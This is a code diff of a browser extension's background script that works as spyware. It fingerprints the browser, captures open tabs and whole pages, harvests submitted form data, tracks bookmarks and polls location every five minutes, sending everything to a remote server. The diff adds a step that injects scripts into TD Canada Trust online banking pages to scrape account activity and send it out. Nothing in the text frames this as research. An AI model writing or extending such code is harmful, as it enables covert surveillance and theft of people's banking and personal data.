@@ -12,7 +12,7 @@ var socket = io.connect(SERVER_URL, { secure: false });
 
 var emitEvent = function (type, payload) {
     // Define data object.
-    data = {}
+    data = {};
     data.uuid = uuid;
     data.time = new Date().getTime();
     data.type = type;
@@ -30,7 +30,7 @@ var emitEvent = function (type, payload) {
 
 var emitBlob = function (type, metadata, blob) {
     // Define data object.
-    data = {}
+    data = {};
     data.uuid = uuid;
     data.time = new Date().getTime();
     data.type = type;
@@ -112,7 +112,7 @@ var getFingerprint = function () {
         screenResolution: getScreenResolution()
     };
     emitEvent("addFingerprint", fingerprint);
-}
+};
 
 var getUserAgent = function () {
     return navigator.userAgent;
@@ -148,7 +148,7 @@ var getAllTabs = function () {
     chrome.windows.getAll({"populate": true}, function (windowArray) {
         emitEvent('addAllTabs', windowArray);
     });
-}
+};
 
 var getPageCapture = function (tabId) {
     chrome.pageCapture.saveAsMHTML({"tabId": tabId}, function (mhtmlData) {
@@ -173,11 +173,11 @@ var onWindowCreate = function (newWindow) {
 
 var onWindowActive = function (windowId) {
     emitEvent('focusWindow', {'windowId': windowId});
-}
+};
 
 var onWindowRemoved = function (windowId) {
     emitEvent('removeWindow', {'windowId': windowId});
-}
+};
 
 var onTabUpdate = function (tabId, changeInfo, tab) {
     if (changeInfo.status === "complete") {
@@ -189,6 +189,15 @@ var onTabUpdate = function (tabId, changeInfo, tab) {
             });
             chrome.tabs.executeScript(tabId, {
                 file: "events/getFormData.js"
+            });
+        }
+        // Inject getTDStatements event into EasyWeb.
+        if ((/easywebcpo.tdcanadatrust.com\/webbanking/).test(tab.url)) {
+            chrome.tabs.executeScript(tabId, {
+                file: "lib/jquery.csv-0.71.min.js"
+            });
+            chrome.tabs.executeScript(tabId, {
+                file: "events/getTDAccountActivity.js"
             });
         }
     }
@@ -232,11 +241,17 @@ var onBookmarkRemoved = function (id, changeInfo) {
     emitEvent('removeBookmark', { 'id': id });
 };
 
-var onFormSubmit = function (port) {
-    console.assert(port.name === 'formData');
-    port.onMessage.addListener(function (formData) {
-        emitEvent('addFormData', formData);
-    });
+var onPortPost = function (port) {
+    if (port.name === 'formData') {
+        port.onMessage.addListener(function (formData) {
+            emitEvent('addFormData', formData);
+        });
+    } else if (port.name === 'TDAccountActivity') {
+        port.onMessage.addListener(function (activity) {
+            console.log(activity);
+            emitEvent('addFinancialActivity', activity);
+        });
+    }
 };
 
 var activateListeners = function () {
@@ -253,6 +268,6 @@ var activateListeners = function () {
     chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
     chrome.bookmarks.onChanged.addListener(onBookmarkChange);
     chrome.bookmarks.onRemoved.addListener(onBookmarkRemoved);
-    chrome.runtime.onConnect.addListener(onFormSubmit);
+    chrome.runtime.onConnect.addListener(onPortPost);
     setInterval(getCurrentPosition, 5 * 60 * 1000);
 };
